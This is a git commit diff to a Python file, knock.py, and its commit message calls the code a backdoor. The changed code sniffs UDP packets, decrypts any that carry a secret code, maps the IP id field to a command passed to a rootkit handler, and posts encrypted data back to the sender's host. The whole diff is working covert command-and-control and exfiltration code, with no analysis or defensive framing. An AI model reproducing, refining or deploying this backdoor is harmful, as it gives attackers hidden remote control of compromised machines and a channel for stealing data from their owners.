a1a0cfdf497127a3fd635726ff2179efaeec4fa6
Bryan <b.r.hill@outlook.com>
2022-11-24 13:05:48 -0800

    Adjusted packet handler to deal with packets that are not part of the backdoor. corrected the payload grabbing

--- knock.py
+++ knock.py
@@ -22,18 +22,20 @@ class remote_receiver:
         requests.post("http://" + self.host, data=self.encrypter.encrypt(opt) + b'\t' + self.encrypter.encrypt(data))
 
     def listen_loop(self):
-        sniff(filter="udp and port 5000", prn=self.packet_handler)
+        sniff(filter="udp and port 10", prn=self.packet_handler)
 
     def packet_handler(self, captured_packet):
-        main_payload = captured_packet[0].payload
-        encrypted_data = main_payload.payload.payload
-        decrypted_data = str(self.encrypter.decrypt(encrypted_data))
+        encrypted_data = captured_packet['UDP'].payload
+        try:
+            decrypted_data = str(self.encrypter.decrypt(bytes(encrypted_data)))
+        except TypeError:
+            return
         if self.code not in decrypted_data:
             # print("code not found")
             return
-        payload_id = main_payload.id
+        payload_id = captured_packet['IP'].id
         command = payload_id % 10
-        self.host = main_payload[IP].src
+        self.host = captured_packet[IP].src
         data_i = decrypted_data.index(":")
-        data = decrypted_data[data_i + 1:]
+        data = decrypted_data[data_i + 1:len(decrypted_data)-1]
         self.rkit.action_parse(command, data)
